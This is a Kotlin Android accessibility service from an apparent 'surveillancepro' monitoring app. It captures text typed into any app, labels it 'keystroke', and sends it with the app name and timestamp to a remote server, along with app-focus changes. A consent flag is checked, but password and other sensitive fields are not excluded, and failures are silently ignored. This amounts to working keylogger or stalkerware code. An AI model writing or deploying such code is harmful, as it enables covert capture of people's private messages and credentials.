package com.surveillancepro.android.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.surveillancepro.android.data.ApiClient
import com.surveillancepro.android.data.DeviceStorage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SupervisionAccessibilityService : AccessibilityService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastText = ""
    private var lastPackage = ""
    private var lastSendTime = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event, storage)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleFocusChanged(event, storage)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent, storage: DeviceStorage) {
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank() || text == lastText) return
        if (text.length < 3) return

        val packageName = event.packageName?.toString() ?: "unknown"
        val now = System.currentTimeMillis()

        // Debounce : n'envoyer que toutes les 2 secondes minimum et si le texte a changé significativement
        if (now - lastSendTime < 2000 && packageName == lastPackage) return

        lastText = text
        lastPackage = packageName
        lastSendTime = now

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        scope.launch {
            try {
                val api = ApiClient.getInstance(storage)
                api.sendEvent("keystroke", mapOf(
                    "text" to text.take(500),
                    "app" to packageName,
                    "fieldType" to (event.className?.toString() ?: ""),
                    "timestamp" to timestamp,
                ))
            } catch (_: Exception) {}
        }
    }

    private fun handleFocusChanged(event: AccessibilityEvent, storage: DeviceStorage) {
        val packageName = event.packageName?.toString() ?: return
        if (packageName == lastPackage) return
        lastPackage = packageName

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        scope.launch {
            try {
                val api = ApiClient.getInstance(storage)
                api.sendEvent("app_focus", mapOf(
                    "app" to packageName,
                    "timestamp" to timestamp,
                ))
            } catch (_: Exception) {}
        }
    }

    override fun onInterrupt() {}
}
